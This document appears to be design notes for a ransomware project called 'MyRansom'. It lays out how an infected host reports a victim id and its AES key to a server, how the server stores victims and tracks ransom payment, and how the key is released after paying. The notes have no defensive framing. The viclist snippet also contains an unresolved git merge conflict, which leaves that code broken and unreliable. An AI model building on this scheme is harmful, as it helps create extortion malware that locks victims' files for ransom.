# Args of MyRansom

## infected host

### init

```python
post_data = {
    'id': uuid.uuid1().hex
}
```

### aes key

```python
self.aes_key = self.enc_key()
post_data = {
    'id': self.id,
    'aes_key': self.aes_key
}
```

### paid

```python
post_data = {
    'id': self.id,
    'aes_key': self.aes_key,
    'ransom': True
}
```

## Server

### database

```sql
    ID         VARCHAR(32)    NOT NULL,
    INFTIME    VARCHAR(100)    NOT NULL,
    RANSOM     BOOLEAN         NOT NULL,
    AESKEY     VARCHAR(100)    NOT NULL
```

### viclist

```python
viclist = [
    {
        'id': victim_id,
<<<<<<< HEAD
        'inf_time': time.time()
=======
        'inftime': time.ctime()
>>>>>>> b33833f424f190a3d45f18dd6de8409bdcb4859d
        'ransom': False,
        'AES_key': aes_key
    }
]
```

### paid

```python
aes_key = dec_key()
post_data = {
    'id': victim_id,
    'aes_key': aes_key
}
```

## Front-end
